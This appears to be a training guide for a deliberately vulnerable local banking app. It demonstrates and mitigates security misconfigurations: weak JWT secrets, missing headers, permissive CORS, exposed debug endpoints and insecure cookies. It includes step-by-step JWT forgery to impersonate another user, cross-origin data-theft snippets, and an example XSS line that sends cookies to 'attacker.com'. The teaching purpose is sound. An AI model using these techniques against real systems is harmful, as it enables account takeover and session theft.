# Security Misconfiguration

Security misconfiguration occurs when security settings are defined, implemented, or maintained improperly. This includes weak secret keys, permissive CORS policies, missing security headers, debug mode in production, and insecure session management.

## Prerequisites

- Browser access to functioning web app
- One registered user account
- Access to browser developer tools (Network and Console tabs)

## Configuration

**Option 1: Runtime Toggle (Recommended for Testing)**

Use the Security Hardening toggle on the dashboard at `http://localhost:5000/dashboard` to switch between vulnerable and hardened modes without restarting the application.

**Option 2: Environment Variables (Persistent Configuration)**

Set the following in your `.env` file:

```
SECURITY_HARDENING_ENABLED=false  # Vulnerable state
FLASK_SECRET_KEY=secret123        # Weak secret key
JWT_SECRET_KEY=secret123          # Weak JWT secret
```

Restart required after changing `.env` file:
- Docker: `docker-compose down && docker-compose up -d`
- Local: Stop server (Ctrl+C) and run `python app.py`

## Demonstrations

### Weak Secret Keys

Allows attackers to forge session tokens and JWT tokens using easily guessable secrets.

#### Exploit

##### Method 1: JWT Token Forgery via Local Tool

**Setup:**
1. Ensure Security Hardening is **disabled** (vulnerable mode) - this ensures weak secret keys are in use
2. Create two test accounts (e.g., `attacker` and `victim`)
3. Login as `victim` and note their account details
4. Logout

**Obtain Victim's Token Structure:**
1. Login as `victim` at `http://localhost:5000`
2. Press F12 → **Storage** tab (Firefox) or **Application** tab (Chrome)
3. Click **Cookies** → `http://localhost:5000`
4. Find the `token` cookie and copy its value (starts with `eyJ...`)
5. Open `forge_jwt.html` and decode the token to see victim's `user_id`
6. Logout from victim account

**Forge and Use Token:**
1. Login as `attacker` at `http://localhost:5000`
2. F12 → **Cookies** → copy the `token` cookie value
3. Open `forge_jwt.html` in your browser (double-click the file)
4. Paste attacker's token → Click "Decode Token"
5. In Step 2, modify the payload:
   - Change `user_id` to victim's user_id (from earlier)
   - Change `username` to `"victim"`
   - Keep `is_admin` value as-is or modify if testing privilege escalation
   - Do NOT add `exp` field (vulnerable mode tokens don't have expiration)
6. Click "Forge Token with New Payload" (uses weak secret `secret123`)
7. Copy the forged token
8. Back in browser: F12 → **Cookies** → double-click the `token` cookie **Value**
9. Replace with your forged token → Press Enter
10. Refresh the page (F5)

**Expected Result (Vulnerable):** Dashboard now shows victim's account information (name, account number, balance). You successfully impersonated victim by forging a JWT token with the weak secret `secret123`.

**Important:** The server authenticates using the `token` **cookie**, not LocalStorage. You must replace the cookie value to use the forged token.

##### Method 2: JWT Token Forgery via jwt.io (Alternative)

1. Log in to your account
2. Open browser developer tools (F12)
3. Go to Application tab → Storage → Local Storage → `http://localhost:5000`
4. Locate and copy the entire `jwt_token` value (long string starting with `eyJ...`)
5. Open https://jwt.io in a new tab
6. Paste your token into the "Encoded" section
7. In the "Verify Signature" section at the bottom, enter:
   ```
   secret123
   ```
8. Observe the "Signature Verified" message appears

**Expected Result (Vulnerable):** JWT signature verifies successfully with the weak secret `secret123`. An attacker can now:
- Modify the payload (e.g., change `user_id`, `is_admin`)
- Generate a new valid signature using `secret123`
- Forge tokens to impersonate any user

##### Method 3: Token Forgery via Browser Console

1. Open browser console (F12 → Console)
2. Execute the following to decode your current token:
   ```javascript
   const token = localStorage.getItem('jwt_token');
   const payload = JSON.parse(atob(token.split('.')[1]));
   console.log('Current token payload:', payload);
   ```
3. Note the `user_id` and `is_admin` values
4. An attacker with knowledge of the weak secret (`secret123`) can forge tokens using libraries like PyJWT or online tools

#### Mitigate

1. Generate strong random secrets using Python:
   ```bash
   python -c "import secrets; print(secrets.token_urlsafe(32))"
   ```
   Run this command twice to generate two different secrets
2. Update `.env` file with the generated secrets:
   ```
   SECURITY_HARDENING_ENABLED=true
   FLASK_SECRET_KEY=your-generated-secret-key-here-32-chars-minimum
   JWT_SECRET_KEY=your-other-generated-secret-key-here-32-chars-minimum
   ```
3. Restart the application:
   - Docker: `docker-compose down && docker-compose up -d`
   - Local: Stop server (Ctrl+C) and run `python app.py`
4. Log in again (old tokens are now invalid)
5. Copy your new JWT token and try to verify it on jwt.io using `secret123`

**Expected Result (Protected):** JWT signature verification fails with `secret123`. The token can only be verified with the strong random secret, which attackers cannot guess.

**Note on Token Expiration:** When hardening is enabled, tokens expire after 5 seconds (configured in `mitigations/session_exp.py`) for quick demonstration purposes. If you need tokens to last longer for extended testing, modify `timedelta(seconds=5)` to a longer duration in that file (e.g., `timedelta(hours=1)`).

### Missing Security Headers

Exposes application to clickjacking, MIME-type sniffing, and other attacks.

#### Exploit

1. Ensure Security Hardening is **disabled** (vulnerable mode)
2. Log in to your account
3. Open browser developer tools (F12)
4. Go to Network tab
5. Refresh the page
6. Click on any request to the application
7. Go to Headers tab and check Response Headers
8. Observe missing security headers:
   - No `X-Content-Type-Options`
   - No `X-Frame-Options`
   - No `X-XSS-Protection`
   - No `Strict-Transport-Security`

**Expected Result (Vulnerable):** Security headers are absent from responses.

#### Mitigate

**Option 1: Using Runtime Toggle (Recommended)**
1. Go to `http://localhost:5000/dashboard`
2. Click "Enable Security Hardening" toggle
3. Open DevTools (F12) → Network tab
4. Refresh the page
5. Click on the main document request (usually the first one, named `dashboard`)
6. Go to the Headers tab → Response Headers section
7. Look for the security headers

**Option 2: Using Environment Variables**
1. Update `.env` file:
   ```
   SECURITY_HARDENING_ENABLED=true
   ```
2. Restart the application:
   - Docker: `docker-compose down && docker-compose up -d`
   - Local: Stop server (Ctrl+C) and run `python app.py`
3. Follow steps 3-7 above

**Alternative: Check via Browser Console**
```javascript
fetch(window.location.href)
    .then(response => {
        console.log('Security Headers:');
        console.log('X-Content-Type-Options:', response.headers.get('X-Content-Type-Options'));
        console.log('X-Frame-Options:', response.headers.get('X-Frame-Options'));
        console.log('X-XSS-Protection:', response.headers.get('X-XSS-Protection'));
        console.log('Strict-Transport-Security:', response.headers.get('Strict-Transport-Security'));
    });
```

**Expected Result (Protected):** Response includes security headers:
- `X-Content-Type-Options: nosniff` - Prevents MIME-type sniffing
- `X-Frame-Options: DENY` - Prevents clickjacking
- `X-XSS-Protection: 1; mode=block` - Enables browser XSS filter
- `Strict-Transport-Security: max-age=31536000; includeSubDomains` - Forces HTTPS

### Permissive CORS Policy

Allows any origin to make cross-origin requests, exposing sensitive data.

#### Exploit

##### Method 1: Malicious HTML Page Attack

1. Ensure Security Hardening is **disabled** (vulnerable mode)
2. Ensure you are logged into Vulnerable Bank (http://localhost:5000) in your browser
3. Open the included `attack.html` file by double-clicking it (located in the project root)
   - The file opens with `file://` origin (simulating a malicious website)
   - It provides two attack buttons with visual feedback
4. Click "Launch Attack on /api/security-config"
5. Click "Launch Attack on /check_balance/ACC1001"

**Expected Result (Vulnerable):**
- Both attacks show red "ATTACK SUCCEEDED" boxes
- Stolen security configuration data is displayed
- Balance data is returned (even with invalid token, shows error message was accessible)
- Console shows successful cross-origin requests from `file://` origin
- CORS allows requests from any origin including `null` (file://)

##### Method 2: Via Browser Console (Quick Test)

1. Ensure Security Hardening is **disabled** (vulnerable mode)
2. Log into Vulnerable Bank at http://localhost:5000
3. Open a completely different website (e.g., google.com) in a new tab
4. Open browser console on that tab
5. Execute:
   ```javascript
   fetch('http://localhost:5000/api/security-config')
       .then(r => r.json())
       .then(data => console.log('Cross-origin data stolen:', data))
       .catch(e => console.log('Blocked by CORS:', e));
   ```

**Expected Result (Vulnerable):** Request succeeds and returns data despite originating from a different domain.

#### Mitigate

**Option 1: Using Runtime Toggle (No Restart Required)**
1. Go to http://localhost:5000
2. Enable the "Global Security Hardening" toggle at the top of the page
3. Open `attack.html` and click both attack buttons

**Option 2: Using Environment Variables (Persistent)**
1. Update `.env` file:
   ```
   SECURITY_HARDENING_ENABLED=true
   ALLOWED_CORS_ORIGINS=http://localhost:5000,http://127.0.0.1:5000
   ```
   Note: Only specify the exact origins that should have access
2. Restart the application:
   - Docker: `docker-compose down && docker-compose up -d`
   - Local: Stop and run `python app.py`
3. Open `attack.html` and click both attack buttons

**Expected Result (Protected):**
- Both attacks show green "ATTACK BLOCKED BY CORS!" boxes
- Browser console shows CORS error: `Failed to fetch`
- Server returns 403 Forbidden for cross-origin requests
- Only requests from `http://localhost:5000` are allowed

### Debug Mode in Production

Exposes detailed error messages and debug endpoints with sensitive information.

#### Exploit

##### Method 1: Accessing Debug Endpoint

1. Ensure Security Hardening is **disabled** (vulnerable mode)
2. In your browser address bar, navigate to:
   ```
   http://localhost:5000/debug/users
   ```
3. Observe exposed debug information including:
   - Complete list of all users in the database
   - User IDs and usernames
   - Account numbers
   - **Plain text passwords**
   - Admin status flags

**Expected Result (Vulnerable):** Debug endpoint returns JSON with all user records including sensitive data:
```json
{
  "users": [
    {
      "account_number": "ADMIN001",
      "id": 1,
      "is_admin": true,
      "password": "admin123",
      "username": "admin"
    },
    ...
  ]
}
```

##### Method 2: Triggering Detailed Error Messages

1. Login to the application at `http://localhost:5000/dashboard`
2. Open browser console (F12 → Console)
3. Execute an intentionally malformed API request:
   ```javascript
   fetch('/api/bill-payments/create', {
       method: 'POST',
       headers: {
           'Content-Type': 'application/json',
           'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
       },
       body: JSON.stringify({biller_id: 999999, amount: -100})
   })
   .then(r => r.json())
   .then(data => console.log('ERROR:', JSON.stringify(data, null, 2)));
   ```
4. Observe the detailed error response includes:
   - `error_type`: Exception class name (e.g., "NotNullViolation", "IntegrityError")
   - `timestamp`: Exact time of the error
   - `debug_info`: Endpoint name and detailed error information
   - `message`: Full database constraint violation details
   - Internal variable names and values

**Expected Result (Vulnerable):** Error responses contain detailed diagnostic information revealing internal application structure:
```json
{
  "status": "error",
  "message": "null value in column \"payment_method\" violates not-null constraint...",
  "error_type": "NotNullViolation",
  "timestamp": "2026-01-29 05:24:03.523966",
  "debug_info": {
    "endpoint": "create_bill_payment",
    "error_details": "DETAIL: Failing row contains..."
  }
}
```

#### Mitigate

**Option 1: Using Runtime Toggle (Recommended)**
1. Go to `http://localhost:5000/dashboard`
2. Click "Enable Security Hardening" toggle
3. Try accessing the debug endpoint:
   ```
   http://localhost:5000/debug/users
   ```

**Option 2: Using Environment Variables**
1. Update `.env` file:
   ```
   SECURITY_HARDENING_ENABLED=true
   ```
2. Restart the application:
   - Docker: `docker-compose down && docker-compose up -d`
   - Local: Stop server (Ctrl+C) and run `python app.py`
3. Try accessing the debug endpoint:
   ```
   http://localhost:5000/debug/users
   ```

**Test Error Message Handling:**
Execute a malformed API request in browser console:
```javascript
fetch('/api/bill-payments/create', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
    },
    body: JSON.stringify({biller_id: 999999, amount: -100})
})
.then(r => r.json())
.then(data => console.log('ERROR:', JSON.stringify(data, null, 2)));
```

**Expected Result (Protected):**
- Debug endpoint returns `{"status": "error", "message": "Not found"}` with 404 status
- Error responses contain ONLY generic messages without revealing internal details:
```json
{
  "status": "error",
  "message": "An error occurred processing your request. Please contact support if this persists.",
  "error_code": "ERR_500"
}
```

**Notice what's MISSING in hardened mode:**
- ✗ No `error_type` (exception class names)
- ✗ No `timestamp` (error timing information)
- ✗ No `debug_info` (endpoint details)
- ✗ No database constraint details
- ✗ No stacktraces or file paths
- ✗ No internal variable names

### Insecure Cookie Configuration

Session cookies lack security flags, exposing them to interception and XSS attacks.

#### Exploit

##### Method 1: Inspecting Cookie Security via DevTools

1. Ensure Security Hardening is **disabled** (vulnerable mode)
2. Log in to your account at http://localhost:5000
3. Open browser developer tools (F12)
4. Go to Application tab → Storage → Cookies → `http://localhost:5000`
5. Locate the `token` cookie in the list
6. Examine the cookie properties columns:
   - **Secure**: Should show ✗ (checkmark missing - allows HTTP transmission)
   - **HttpOnly**: Should show ✗ (allows JavaScript access)
   - **SameSite**: Shows "None" or blank (vulnerable to CSRF)
7. Note the cookie value (your session token)

**Expected Result (Vulnerable):** Cookie lacks all three critical security flags, making it vulnerable to:
- Interception over unencrypted connections
- Theft via XSS attacks
- CSRF attacks from malicious sites

##### Method 2: Accessing Cookie via JavaScript (Demonstrates HttpOnly Risk)

1. Ensure Security Hardening is **disabled** (vulnerable mode)
2. Remain logged in
3. Open browser console (F12 → Console)
4. Execute:
   ```javascript
   // This should work if HttpOnly is disabled
   console.log('All cookies:', document.cookie);

   // Extract just the token
   const cookies = document.cookie.split('; ');
   const tokenCookie = cookies.find(c => c.startsWith('token='));
   if (tokenCookie) {
       console.log('Session token accessible via JS:', tokenCookie);
       console.log('This token can be stolen by XSS attacks!');
   }
   ```

**Expected Result (Vulnerable):** Console displays the session token. An XSS attack could execute similar code to steal the token:
```javascript
// Malicious XSS payload that would exfiltrate the cookie
fetch('https://attacker.com/steal?cookie=' + document.cookie);
```

##### Method 3: Demonstrating Missing Secure Flag

1. Ensure Security Hardening is **disabled** (vulnerable mode)
2. Note that the application is running on `http://localhost:5000` (not HTTPS)
3. The session cookie is transmitted in clear text over HTTP
4. Execute in console to see request headers:
   ```javascript
   fetch('/api/security-config', {
       credentials: 'include'
   })
   .then(r => {
       console.log('Cookie sent over HTTP - visible to network sniffers');
       return r.json();
   });
   ```

**Expected Result (Vulnerable):** Cookie transmitted without encryption. Network sniffers (like Wireshark) can capture the session token in plaintext.

#### Mitigate

**Option 1: Using Runtime Toggle (Recommended)**
1. Go to `http://localhost:5000/dashboard`
2. Click "Enable Security Hardening" toggle
3. Log out and log in again (to get a new secure cookie)
4. Open DevTools → Application → Cookies
5. Examine the `token` cookie properties
6. Try accessing the cookie via JavaScript:
   ```javascript
   console.log('Trying to access cookie:', document.cookie);
   // Should no longer show the token cookie
   ```

**Option 2: Using Environment Variables**
1. Update `.env` file:
   ```
   SECURITY_HARDENING_ENABLED=true
   ```
2. Restart the application:
   - Docker: `docker-compose down && docker-compose up -d`
   - Local: Stop server (Ctrl+C) and run `python app.py`
3. Log out and log in again (to get a new secure cookie)
4. Follow steps 4-6 above

**Expected Result (Protected):**
- **DevTools shows secure flags:**
  - `Secure`: ✓ (HTTPS-only, prevents transmission over unencrypted connections)
  - `HttpOnly`: ✓ (prevents JavaScript access via `document.cookie`)
  - `SameSite`: `Strict` (prevents CSRF attacks by blocking cross-site requests)
- **Console shows:** The `token` cookie is missing from `document.cookie` output (empty string or no token visible)
- **Cookie cannot be stolen** via XSS attacks (HttpOnly protection)
- **CSRF attacks prevented** by SameSite=Strict

## Technical Details

**Vulnerable Configuration:**
- Weak secret keys (`secret123`)
- No security headers
- Permissive CORS (`*` or broad origins)
- Debug mode enabled in production
- Insecure cookie flags

**Hardened Configuration:**
- Strong random secret keys (32+ characters)
- Comprehensive security headers
- Restricted CORS to specific origins
- Debug mode disabled
- Secure cookie configuration

Affected files:
- `app.py`: Security configuration and header management
- `.env.example`: Environment variable documentation
